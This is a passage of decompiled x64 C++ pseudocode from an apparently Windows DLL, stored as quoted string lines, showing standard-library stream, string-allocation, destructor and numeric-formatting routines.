    "  int **v7; // rsi",
    "  __int64 v8; // rdx",
    "  __int64 v9; // rcx",
    "  __int64 v10; // rbp",
    "  int v11; // eax",
    "",
    "  v3 = a3;",
    "  if ( a3 > 0 )",
    "  {",
    "    v7 = (int **)(a1 + 10);",
    "    do",
    "    {",
    "      v8 = *a1[7];",
    "      if ( v8 && (v9 = **v7, (int)v9 > 0) )",
    "      {",
    "        v10 = v3;",
    "        if ( v3 >= v9 )",
    "          v10 = **v7;",
    "        sub_180036160(a2, v8, v10);",
    "        v3 -= v10;",
    "        **v7 -= v10;",
    "        *a1[7] += (int)v10;",
    "      }",
    "      else",
    "      {",
    "        v11 = ((__int64 (__fastcall *)(_QWORD **))(*a1)[7])(a1);",
    "        if ( v11 == -1 )",
    "          return a3 - v3;",
    "        *a2 = v11;",
    "        v7 = (int **)(a1 + 10);",
    "        --v3;",
    "        v10 = 1;",
    "      }",
    "      a2 += v10;",
    "    }",
    "    while ( v3 > 0 );",
    "  }",
    "  return a3 - v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800069F0(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "  _QWORD *v3; // rcx",
    "  unsigned __int8 *v4; // rdx",
    "",
    "  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 48LL))(a1);",
    "  if ( (_DWORD)result != -1 )",
    "  {",
    "    --**(_DWORD **)(a1 + 80);",
    "    v3 = *(_QWORD **)(a1 + 56);",
    "    v4 = (unsigned __int8 *)(*v3)++;",
    "    return *v4;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void **__fastcall sub_180006A40(_QWORD *a1)",
    "{",
    "  __int64 v1; // rbx",
    "  void **result; // rax",
    "  __int64 v3; // rcx",
    "  void (__fastcall ***v4)(_QWORD, __int64); // rax",
    "",
    "  v1 = a1[12];",
    "  result = &off_18003A550;",
    "  *a1 = &off_18003A550;",
    "  if ( v1 )",
    "  {",
    "    v3 = *(_QWORD *)(v1 + 8);",
    "    if ( v3 )",
    "    {",
    "      v4 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);",
    "      if ( v4 )",
    "        (**v4)(v4, 1);",
    "    }",
    "    return (void **)sub_1800116E0(v1, 16);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006AA0(__int64 a1, _QWORD *a2)",
    "{",
    "  _QWORD *v4; // rsi",
    "  _QWORD *v5; // rdx",
    "",
    "  *(_QWORD *)a1 = &unk_180044A88;",
    "  *(_QWORD *)(a1 + 152) = 0;",
    "  *(_QWORD *)(a1 + 160) = 0;",
    "  *(_DWORD *)(a1 + 168) = 0;",
    "  *(_QWORD *)(a1 + 176) = 0;",
    "  *(_QWORD *)(a1 + 184) = 0;",
    "  *(_QWORD *)(a1 + 192) = 0;",
    "  *(_QWORD *)(a1 + 200) = 0;",
    "  *(_QWORD *)(a1 + 208) = 0;",
    "  *(_QWORD *)(a1 + 144) = &off_18003A530;",
    "  *(_QWORD *)(a1 + 216) = 0;",
    "  *(_QWORD *)(a1 + 224) = 0;",
    "  *(_BYTE *)(a1 + 232) = 0;",
    "  v4 = (_QWORD *)(a1 + 16);",
    "  sub_180008790(a1, a1 + 16);",
    "  *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1) = &off_180044A98;",
    "  *(_DWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 - 4) = *(_DWORD *)(*(_QWORD *)a1 + 4LL) - 144;",
    "  sub_1800094E0(v4);",
    "  *v4 = &off_180044AA8;",
    "  v5 = a2;",
    "  if ( a2[3] > 0xFu )",
    "    v5 = (_QWORD *)*a2;",
    "  sub_180009390(v4, v5, a2[2], 2);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006BD0(_QWORD *a1)",
    "{",
    "  *a1 = &off_18003A520;",
    "  return sub_1800108D0(a1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006BF0(__int64 *a1)",
    "{",
    "  __int64 v2; // rcx",
    "  __int64 result; // rax",
    "",
    "  v2 = *a1;",
    "  if ( v2 )",
    "    result = sub_18001A2CC(v2);",
    "  *a1 = 0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006C20(__int64 a1, unsigned __int64 a2, char a3)",
    "{",
    "  unsigned __int64 v3; // rdi",
    "  unsigned int v4; // r14d",
    "  __int64 v5; // rbp",
    "  __int64 result; // rax",
    "  unsigned __int64 v9; // rax",
    "  __int64 v10; // rax",
    "  unsigned __int64 v11; // rcx",
    "",
    "  v3 = 0;",
    "  v4 = a3;",
    "  v5 = 0x7FFFFFFFFFFFFFFFLL;",
    "  *(_OWORD *)a1 = 0;",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 24) = 0;",
    "  if ( a2 > 0x7FFFFFFFFFFFFFFFLL )",
    "    std::vector<void *>::_Xlen();",
    "  if ( a2 <= 0xF )",
    "  {",
    "    *(_QWORD *)(a1 + 16) = a2;",
    "    *(_QWORD *)(a1 + 24) = 15;",
    "    sub_1800368A0(a1, (unsigned int)a3, a2);",
    "    result = a1;",
    "    *(_BYTE *)(a2 + a1) = 0;",
    "    return result;",
    "  }",
    "  if ( (a2 | 0xF) > 0x7FFFFFFFFFFFFFFFLL )",
    "  {",
    "    v9 = 0x8000000000000027uLL;",
    "LABEL_6:",
    "    v10 = sub_180011714(v9);",
    "    if ( !v10 )",
    "      invalid_parameter_noinfo_noreturn();",
    "    v3 = (v10 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    *(_QWORD *)(v3 - 8) = v10;",
    "    goto LABEL_15;",
    "  }",
    "  v5 = a2 | 0xF;",
    "  if ( (a2 | 0xF) < 0x16 )",
    "    v5 = 22;",
    "  v11 = v5 + 1;",
    "  if ( v5 == -1 )",
    "    goto LABEL_15;",
    "  if ( v11 >= 0x1000 )",
    "  {",
    "    v9 = v5 + 40;",
    "    if ( v5 + 40 < (unsigned __int64)(v5 + 1) )",
    "      Concurrency::cancel_current_task();",
    "    goto LABEL_6;",
    "  }",
    "  v3 = sub_180011714(v11);",
    "LABEL_15:",
    "  *(_QWORD *)a1 = v3;",
    "  *(_QWORD *)(a1 + 16) = a2;",
    "  *(_QWORD *)(a1 + 24) = v5;",
    "  sub_1800368A0(v3, v4, a2);",
    "  result = a1;",
    "  *(_BYTE *)(v3 + a2) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006D30(__int64 a1, __int64 a2)",
    "{",
    "  unsigned __int64 v2; // rax",
    "  _OWORD *v4; // rbp",
    "  unsigned __int64 v5; // rsi",
    "  __int64 v6; // rdi",
    "  __int64 result; // rax",
    "  unsigned __int64 v8; // rax",
    "  __int64 v9; // rax",
    "  __int64 v10; // rcx",
    "  unsigned __int64 v11; // rcx",
    "",
    "  v2 = 0;",
    "  *(_OWORD *)a1 = 0;",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 24) = 0;",
    "  v4 = (_OWORD *)a2;",
    "  if ( *(_QWORD *)(a2 + 24) > 0xFu )",
    "    v4 = *(_OWORD **)a2;",
    "  v5 = *(_QWORD *)(a2 + 16);",
    "  v6 = 0x7FFFFFFFFFFFFFFFLL;",
    "  if ( v5 > 0x7FFFFFFFFFFFFFFFLL )",
    "    std::vector<void *>::_Xlen();",
    "  if ( v5 <= 0xF )",
    "  {",
    "    *(_QWORD *)(a1 + 16) = v5;",
    "    result = a1;",
    "    *(_QWORD *)(a1 + 24) = 15;",
    "    *(_OWORD *)a1 = *v4;",
    "    return result;",
    "  }",
    "  if ( (v5 | 0xF) > 0x7FFFFFFFFFFFFFFFLL )",
    "  {",
    "    v8 = 0x8000000000000027uLL;",
    "LABEL_8:",
    "    v9 = sub_180011714(v8);",
    "    v10 = v9;",
    "    if ( !v9 )",
    "      invalid_parameter_noinfo_noreturn();",
    "    v2 = (v9 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    *(_QWORD *)(v2 - 8) = v10;",
    "    goto LABEL_17;",
    "  }",
    "  v6 = v5 | 0xF;",
    "  if ( (v5 | 0xF) < 0x16 )",
    "    v6 = 22;",
    "  v11 = v6 + 1;",
    "  if ( v6 == -1 )",
    "    goto LABEL_17;",
    "  if ( v11 >= 0x1000 )",
    "  {",
    "    v8 = v6 + 40;",
    "    if ( v6 + 40 < (unsigned __int64)(v6 + 1) )",
    "      Concurrency::cancel_current_task();",
    "    goto LABEL_8;",
    "  }",
    "  v2 = sub_180011714(v11);",
    "LABEL_17:",
    "  *(_QWORD *)a1 = v2;",
    "  *(_QWORD *)(a1 + 16) = v5;",
    "  *(_QWORD *)(a1 + 24) = v6;",
    "  sub_180036160(v2, v4, v5 + 1);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006E50(__int64 a1, char a2)",
    "{",
    "  sub_180005CB0(a1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 152);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006E90(__int64 a1, char a2)",
    "{",
    "  __int64 v2; // rdi",
    "",
    "  v2 = a1 - 176;",
    "  sub_180003D70((_QWORD *)(a1 - 176));",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(v2, 272);",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180006ED0(__int64 a1, char a2)",
    "{",
    "  __int64 v2; // rdi",
    "",
    "  v2 = a1 - 152;",
    "  sub_180003780((_QWORD *)(a1 - 152));",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(v2, 248);",
    "  return v2;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180006F10(_QWORD *a1, char a2)",
    "{",
    "  _QWORD *v4; // rdi",
    "  __int64 v5; // r8",
    "  __int64 v6; // rcx",
    "",
    "  v4 = a1 - 4;",
    "  *(_QWORD *)((char *)a1 + *(int *)(*(a1 - 4) + 4LL) - 32) = &off_180044B28;",
    "  v5 = *(int *)(*(a1 - 4) + 4LL);",
    "  *(_DWORD *)((char *)a1 + v5 - 36) = v5 - 32;",
    "  *(_QWORD *)((char *)a1 + *(int *)(*(a1 - 2) + 4LL) - 16) = &off_18003A540;",
    "  v6 = *(int *)(*(a1 - 2) + 4LL);",
    "  *(_DWORD *)((char *)a1 + v6 - 20) = v6 - 16;",
    "  *(_QWORD *)((char *)a1 + *(int *)(*v4 + 4LL) - 32) = &off_180044A80;",
    "  *(_DWORD *)((char *)a1 + *(int *)(*v4 + 4LL) - 36) = *(_DWORD *)(*v4 + 4LL) - 24;",
    "  *a1 = &off_18003A520;",
    "  sub_1800108D0(a1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(v4, 128);",
    "  return v4;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180006FC0(_QWORD *a1, char a2)",
    "{",
    "  _QWORD *v3; // rdi",
    "  __int64 v4; // r8",
    "",
    "  v3 = a1 - 2;",
    "  *(_QWORD *)((char *)a1 + *(int *)(*(a1 - 2) + 4LL) - 16) = &off_18003A540;",
    "  v4 = *(int *)(*(a1 - 2) + 4LL);",
    "  *(_DWORD *)((char *)a1 + v4 - 20) = v4 - 16;",
    "  *a1 = &off_18003A520;",
    "  sub_1800108D0(a1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(v3, 112);",
    "  return v3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180007030(__int64 a1, char a2)",
    "{",
    "  sub_180006730(a1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 120);",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180007070(_QWORD *a1, char a2)",
    "{",
    "  __int64 v2; // rdi",
    "  __int64 v5; // rcx",
    "  void (__fastcall ***v6)(_QWORD, __int64); // rax",
    "",
    "  v2 = a1[12];",
    "  *a1 = &off_18003A550;",
    "  if ( v2 )",
    "  {",
    "    v5 = *(_QWORD *)(v2 + 8);",
    "    if ( v5 )",
    "    {",
    "      v6 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 16LL))(v5);",
    "      if ( v6 )",
    "        (**v6)(v6, 1);",
    "    }",
    "    sub_1800116E0(v2, 16);",
    "  }",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 104);",
    "  return a1;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_1800070F0(_QWORD *a1, char a2)",
    "{",
    "  _QWORD *v4; // rsi",
    "  __int64 v5; // r8",
    "",
    "  v4 = a1 - 18;",
    "  *(_QWORD *)((char *)a1 + *(int *)(*(a1 - 18) + 4LL) - 144) = &off_180044A98;",
    "  v5 = *(int *)(*(a1 - 18) + 4LL);",
    "  *(_DWORD *)((char *)a1 + v5 - 148) = v5 - 144;",
    "  sub_180006730((__int64)(a1 - 16));",
    "  *(_QWORD *)((char *)a1 + *(int *)(*v4 + 4LL) - 144) = &off_180044A80;",
    "  *(_DWORD *)((char *)a1 + *(int *)(*v4 + 4LL) - 148) = *(_DWORD *)(*v4 + 4LL) - 24;",
    "  *a1 = &off_18003A520;",
    "  sub_1800108D0(a1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(v4, 240);",
    "  return v4;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_1800071A0(_QWORD *a1, char a2)",
    "{",
    "  _QWORD *v3; // rdi",
    "  __int64 v4; // r8",
    "",
    "  v3 = a1 - 3;",
    "  *(_QWORD *)((char *)a1 + *(int *)(*(a1 - 3) + 4LL) - 24) = &off_180044A80;",
    "  v4 = *(int *)(*(a1 - 3) + 4LL);",
    "  *(_DWORD *)((char *)a1 + v4 - 28) = v4 - 24;",
    "  *a1 = &off_18003A520;",
    "  sub_1800108D0(a1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(v3, 120);",
    "  return v3;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180007210(_QWORD *a1, char a2)",
    "{",
    "  *a1 = &off_18003A520;",
    "  sub_1800108D0(a1);",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 96);",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180007250(int a1, __int64 a2, __int128 *a3, int a4, char a5, __int64 a6)",
    "{",
    "  int v9; // eax",
    "  __int128 v11; // [rsp+40h] [rbp-78h] BYREF",
    "  _BYTE v12[64]; // [rsp+50h] [rbp-68h] BYREF",
    "",
    "  v11 = *a3;",
    "  v9 = sub_1800012A0((int)v12, 64, (int)\"%p\", a6);",
    "  sub_180008AB0(a1, a2, (unsigned int)&v11, a4, a5, (__int64)v12, v9);",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800072F0(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, unsigned __int64 a6)",
    "{",
    "  unsigned __int64 v10; // rdx",
    "  __int64 v11; // r8",
    "  int v12; // eax",
    "  __int64 v13; // rsi",
    "  __int64 v14; // rbx",
    "  __int64 v15; // rcx",
    "  int v16; // ecx",
    "  __int64 v17; // rcx",
    "  unsigned __int64 v18; // rdi",
    "  char *v19; // rbx",
    "  int v20; // r8d",
    "  char *v21; // rcx",
    "  int v22; // edx",
    "  char v23; // al",
    "  char v24; // r8",
    "  __int128 *v25; // rcx",
    "  __int64 v26; // rcx",
    "  __int128 *v27; // rax",
    "  unsigned __int64 v28; // rdx",
    "  __int64 v29; // rcx",
    "  __int128 v31; // [rsp+40h] [rbp-49h] BYREF",
    "  __int128 v32; // [rsp+50h] [rbp-39h] BYREF",
    "  __int64 v33; // [rsp+60h] [rbp-29h]",
    "  unsigned __int64 v34; // [rsp+68h] [rbp-21h]",
    "  int v35; // [rsp+70h] [rbp-19h] BYREF",
    "  char v36; // [rsp+78h] [rbp-11h] BYREF",
    "  char v37; // [rsp+79h] [rbp-10h] BYREF",
    "  char v38; // [rsp+7Ah] [rbp-Fh] BYREF",
    "",
    "  v32 = 0;",
    "  v10 = 0;",
    "  v33 = 0;",
    "  v11 = 15;",
    "  v34 = 15;",
    "  LOBYTE(v32) = 0;",
    "  v12 = *(_DWORD *)(a4 + 24) & 0x3000;",
    "  if ( v12 == 12288 )",
    "  {",
    "    LODWORD(v13) = -1;",
    "    v14 = 13;",
    "    goto LABEL_15;",
    "  }",
    "  v13 = *(_QWORD *)(a4 + 32);",
    "  if ( v13 <= 0 )",
    "  {",
    "    if ( v13 )",
    "    {",
    "      v15 = 6;",
    "    }",
    "    else",
    "    {",
    "      if ( !v12 )",
    "      {",
    "        v14 = 1;",
    "        goto LABEL_15;",
    "      }",
    "      v15 = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v15 = (unsigned int)v13;",
    "  }",
    "  v14 = (int)v15;",
    "  if ( v12 == 0x2000 && fabs(*(double *)&a6) > 1.0e10 )",
    "  {",
    "    sub_180017488(v15, &v35);",
    "    v16 = -v35;",
    "    if ( v35 > 0 )",
    "      v16 = v35;",
    "    v14 += 30103 * v16 / 100000;",
    "    v11 = v34;",
    "    v10 = v33;",
    "  }",
    "LABEL_15:",
    "  v17 = v14 + 50;",
    "  if ( v14 + 50 > v10 )",
    "  {",
    "    v18 = v17 - v10;",
    "    if ( v17 - v10 > v11 - v10 )",
    "    {",
    "      sub_18000B230((unsigned int)&v32, v17 - v10, 0, v17 - v10, 0);",
    "    }",
    "    else",
    "    {",
    "      v33 = v14 + 50;",
    "      v19 = (char *)&v32 + v10;",
    "      sub_1800368A0((char *)&v32 + v10, 0, v17 - v10);",
    "      v19[v18] = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v33 = v14 + 50;",
    "    *((_BYTE *)&v32 + v17) = 0;",
    "  }",
    "  v20 = *(_DWORD *)(a4 + 24);",
    "  if ( ((a6 >> 52) & 0x7FF) == 0x7FF )",
    "    LOWORD(v20) = v20 & 0xFFEF;",
    "  v36 = 37;",
    "  if ( (v20 & 0x20) != 0 )",
    "    v37 = 43;",
    "  v21 = &v37;",
    "  if ( (v20 & 0x20) != 0 )",
    "    v21 = &v38;",
    "  if ( (v20 & 0x10) != 0 )",
    "    *v21++ = 35;",
    "  *(_WORD *)v21 = 10798;",
    "  v21[2] = 76;",
    "  v22 = v20 & 0x3000;",
    "  if ( (v20 & 4) != 0 )",
    "  {",
    "    if ( v22 == 0x2000 )",
    "    {",
    "      v23 = 102;",
    "      goto LABEL_41;",
    "    }",
    "    if ( v22 == 12288 )",
    "    {",
    "      v23 = 65;",
    "      goto LABEL_41;",
    "    }",
    "    v23 = 71;",
    "    v24 = 69;",
    "  }",
    "  else",
    "  {",
    "    if ( v22 == 0x2000 )",
    "    {",
    "      v23 = 102;",
    "      goto LABEL_41;",
    "    }",
    "    if ( v22 == 12288 )",
    "    {",
    "      v23 = 97;",
    "      goto LABEL_41;",
    "    }",
    "    v23 = 103;",
    "    v24 = 101;",
    "  }",
    "  if ( v22 == 4096 )",
    "    v23 = v24;",
    "LABEL_41:",
    "  v21[3] = v23;",
    "  v21[4] = 0;",
    "  v25 = &v32;",
    "  if ( v34 > 0xF )",
    "    LODWORD(v25) = v32;",
    "  v26 = (int)sub_1800012A0((int)v25, v33, (int)&v36, (unsigned int)v13, a6);",
    "  v31 = *a3;",
    "  v27 = &v32;",
    "  if ( v34 > 0xF )",
    "    v27 = (__int128 *)v32;",
    "  sub_18000A4D0(a1, a2, (unsigned int)&v31, a4, a5, (__int64)v27, v26, ((a6 >> 52) & 0x7FF) != 2047, v31);",
    "  if ( v34 > 0xF )",
    "  {",
    "    v28 = v34 + 1;",
    "    v29 = v32;",
    "    if ( v34 + 1 >= 0x1000 )",
    "    {",
    "      v28 = v34 + 40;",
    "      v29 = *(_QWORD *)(v32 - 8);",
    "      if ( (unsigned __int64)(v32 - v29 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v29, v28);",
    "  }",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800075F0(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, unsigned __int64 a6)",
    "{",
    "  unsigned __int64 v10; // rdx",
    "  __int64 v11; // r8",
    "  int v12; // eax",
    "  __int64 v13; // rsi",
    "  __int64 v14; // rbx",
    "  __int64 v15; // rcx",
    "  int v16; // ecx",
    "  __int64 v17; // rcx",
    "  unsigned __int64 v18; // rdi",
    "  char *v19; // rbx",
    "  int v20; // r8d",
    "  char *v21; // rcx",
    "  int v22; // edx",
    "  char v23; // al",
    "  char v24; // r8",
    "  __int128 *v25; // rcx",
    "  __int64 v26; // rcx",
    "  __int128 *v27; // rax",
    "  unsigned __int64 v28; // rdx",
    "  __int64 v29; // rcx",
    "  __int128 v31; // [rsp+40h] [rbp-49h] BYREF",
    "  __int128 v32; // [rsp+50h] [rbp-39h] BYREF",
    "  __int64 v33; // [rsp+60h] [rbp-29h]",
    "  unsigned __int64 v34; // [rsp+68h] [rbp-21h]",
    "  int v35; // [rsp+70h] [rbp-19h] BYREF",
    "  char v36; // [rsp+78h] [rbp-11h] BYREF",
    "  char v37; // [rsp+79h] [rbp-10h] BYREF",
    "  char v38; // [rsp+7Ah] [rbp-Fh] BYREF",
    "",
    "  v32 = 0;",
    "  v10 = 0;",
    "  v33 = 0;",
    "  v11 = 15;",
    "  v34 = 15;",
    "  LOBYTE(v32) = 0;",
    "  v12 = *(_DWORD *)(a4 + 24) & 0x3000;",
    "  if ( v12 == 12288 )",
    "  {",
    "    LODWORD(v13) = -1;",
    "    v14 = 13;",
    "    goto LABEL_15;",
    "  }",
    "  v13 = *(_QWORD *)(a4 + 32);",
    "  if ( v13 <= 0 )",
    "  {",
    "    if ( v13 )",
    "    {",
    "      v15 = 6;",
    "    }",
    "    else",
    "    {",
    "      if ( !v12 )",
    "      {",
    "        v14 = 1;",
    "        goto LABEL_15;",
    "      }",
    "      v15 = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v15 = (unsigned int)v13;",
    "  }",
    "  v14 = (int)v15;",
    "  if ( v12 == 0x2000 && fabs(*(double *)&a6) > 1.0e10 )",
    "  {",
    "    sub_180017488(v15, &v35);",
    "    v16 = -v35;",
    "    if ( v35 > 0 )",
    "      v16 = v35;",
    "    v14 += 30103 * v16 / 100000;",
    "    v11 = v34;",
    "    v10 = v33;",
    "  }",
    "LABEL_15:",
    "  v17 = v14 + 50;",
    "  if ( v14 + 50 > v10 )",
    "  {",
    "    v18 = v17 - v10;",
    "    if ( v17 - v10 > v11 - v10 )",
    "    {",
    "      sub_18000B230((unsigned int)&v32, v17 - v10, 0, v17 - v10, 0);",
    "    }",
    "    else",
    "    {",
    "      v33 = v14 + 50;",
    "      v19 = (char *)&v32 + v10;",
    "      sub_1800368A0((char *)&v32 + v10, 0, v17 - v10);",
    "      v19[v18] = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v33 = v14 + 50;",
    "    *((_BYTE *)&v32 + v17) = 0;",
    "  }",
    "  v20 = *(_DWORD *)(a4 + 24);",
    "  if ( ((a6 >> 52) & 0x7FF) == 0x7FF )",
    "    LOWORD(v20) = v20 & 0xFFEF;",
    "  v36 = 37;",
    "  if ( (v20 & 0x20) != 0 )",
    "    v37 = 43;",
    "  v21 = &v37;",
    "  if ( (v20 & 0x20) != 0 )",
    "    v21 = &v38;",
    "  if ( (v20 & 0x10) != 0 )",
    "    *v21++ = 35;",
    "  *(_WORD *)v21 = 10798;",
    "  v22 = v20 & 0x3000;",
    "  if ( (v20 & 4) != 0 )",
    "  {",
    "    if ( v22 == 0x2000 )",
    "    {",
    "      v23 = 102;",
    "      goto LABEL_41;",
    "    }",
    "    if ( v22 == 12288 )",
    "    {",
    "      v23 = 65;",
    "      goto LABEL_41;",
    "    }",
    "    v23 = 71;",
    "    v24 = 69;",
    "  }",
    "  else",
    "  {",
    "    if ( v22 == 0x2000 )",
    "    {",
    "      v23 = 102;",
    "      goto LABEL_41;",
    "    }",
    "    if ( v22 == 12288 )",
    "    {",
    "      v23 = 97;",
    "      goto LABEL_41;",
    "    }",
    "    v23 = 103;",
    "    v24 = 101;",
    "  }",
    "  if ( v22 == 4096 )",
    "    v23 = v24;",
    "LABEL_41:",
    "  v21[2] = v23;",
    "  v21[3] = 0;",
    "  v25 = &v32;",
    "  if ( v34 > 0xF )",
    "    LODWORD(v25) = v32;",
    "  v26 = (int)sub_1800012A0((int)v25, v33, (int)&v36, (unsigned int)v13, a6);",
    "  v31 = *a3;",
    "  v27 = &v32;",
    "  if ( v34 > 0xF )",
    "    v27 = (__int128 *)v32;",
    "  sub_18000A4D0(a1, a2, (unsigned int)&v31, a4, a5, (__int64)v27, v26, ((a6 >> 52) & 0x7FF) != 2047, v31);",
    "  if ( v34 > 0xF )",
    "  {",
    "    v28 = v34 + 1;",
    "    v29 = v32;",
    "    if ( v34 + 1 >= 0x1000 )",
    "    {",
    "      v28 = v34 + 40;",
    "      v29 = *(_QWORD *)(v32 - 8);",
    "      if ( (unsigned __int64)(v32 - v29 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v29, v28);",
    "  }",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800078F0(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, __int64 a6)",
    "{",
    "  __int128 v6; // xmm0",
    "  int v8; // edx",
    "  int v9; // ebx",
    "  char *v11; // rax",
    "  int v12; // ecx",
    "  char v13; // dl",
    "  int v14; // eax",
    "  __int128 v16; // [rsp+40h] [rbp-88h] BYREF",
    "  char v17; // [rsp+50h] [rbp-78h] BYREF",
    "  char v18; // [rsp+51h] [rbp-77h] BYREF",
    "  char v19; // [rsp+52h] [rbp-76h] BYREF",
    "  _BYTE v20[64]; // [rsp+60h] [rbp-68h] BYREF",
    "",
    "  v6 = *a3;",
    "  v17 = 37;",
    "  v8 = *(_DWORD *)(a4 + 24);",
    "  v9 = a4;",
    "  v16 = v6;",
    "  if ( (v8 & 0x20) != 0 )",
    "    v18 = 43;",
    "  v11 = &v18;",
    "  if ( (v8 & 0x20) != 0 )",
    "    v11 = &v19;",
    "  if ( (v8 & 8) != 0 )",
    "    *v11++ = 35;",
    "  *(_WORD *)v11 = 13897;",
    "  v12 = v8 & 0xE00;",
    "  v11[2] = 52;",
    "  if ( v12 == 1024 )",
    "  {",
    "    v13 = 111;",
    "  }",
    "  else if ( v12 == 2048 )",
    "  {",
    "    v13 = ~(8 * v8) & 0x20 | 0x58;",
    "  }",
    "  else",
    "  {",
    "    v13 = 117;",
    "  }",
    "  v11[3] = v13;",
    "  v11[4] = 0;",
    "  v14 = sub_1800012A0((int)v20, 64, (int)&v17, a6);",
    "  sub_180008AB0(a1, a2, (unsigned int)&v16, v9, a5, (__int64)v20, v14);",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180007A00(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, __int64 a6)",
    "{",
    "  __int128 v6; // xmm0",
    "  int v8; // edx",
    "  int v9; // ebx",
    "  char *v11; // rax",
    "  int v12; // ecx",
    "  char v13; // dl",
    "  int v14; // eax",
    "  __int128 v16; // [rsp+40h] [rbp-88h] BYREF",
    "  char v17; // [rsp+50h] [rbp-78h] BYREF",
    "  char v18; // [rsp+51h] [rbp-77h] BYREF",
    "  char v19; // [rsp+52h] [rbp-76h] BYREF",
    "  _BYTE v20[64]; // [rsp+60h] [rbp-68h] BYREF",
    "",
    "  v6 = *a3;",
    "  v17 = 37;",
    "  v8 = *(_DWORD *)(a4 + 24);",
    "  v9 = a4;",
    "  v16 = v6;",
    "  if ( (v8 & 0x20) != 0 )",
    "    v18 = 43;",
    "  v11 = &v18;",
    "  if ( (v8 & 0x20) != 0 )",
    "    v11 = &v19;",
    "  if ( (v8 & 8) != 0 )",
    "    *v11++ = 35;",
    "  *(_WORD *)v11 = 13897;",
    "  v12 = v8 & 0xE00;",
    "  v11[2] = 52;",
    "  if ( v12 == 1024 )",
    "  {",
    "    v13 = 111;",
    "  }",
    "  else if ( v12 == 2048 )",
    "  {",
    "    v13 = ~(8 * v8) & 0x20 | 0x58;",
    "  }",
    "  else",
    "  {",
    "    v13 = 100;",
    "  }",
    "  v11[3] = v13;",
    "  v11[4] = 0;",
    "  v14 = sub_1800012A0((int)v20, 64, (int)&v17, a6);",
    "  sub_180008AB0(a1, a2, (unsigned int)&v16, v9, a5, (__int64)v20, v14);",
    "  return a2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180007B10(int a1, __int64 a2, __int128 *a3, __int64 a4, char a5, unsigned int a6)",
    "{",
    "  __int128 v6; // xmm0",
    "  int v7; // eax",
    "  int v9; // ebx",
    "  char *v11; // rcx",
    "  int v12; // edx",
    "  char v13; // al",
    "  int v14; // eax",
    "  __int128 v16; // [rsp+40h] [rbp-88h] BYREF",
    "  char v17; // [rsp+50h] [rbp-78h] BYREF",
    "  char v18; // [rsp+51h] [rbp-77h] BYREF",
    "  char v19; // [rsp+52h] [rbp-76h] BYREF",
    "  _BYTE v20[64]; // [rsp+60h] [rbp-68h] BYREF",
    "",
    "  v6 = *a3;",
    "  v7 = *(_DWORD *)(a4 + 24);",
    "  v17 = 37;",
    "  v16 = v6;",
    "  v9 = a4;",
    "  if ( (v7 & 0x20) != 0 )",
    "    v18 = 43;",
    "  v11 = &v18;",
    "  if ( (v7 & 0x20) != 0 )",
    "    v11 = &v19;",
    "  if ( (v7 & 8) != 0 )",
    "    *v11++ = 35;",
    "  *v11 = 108;",
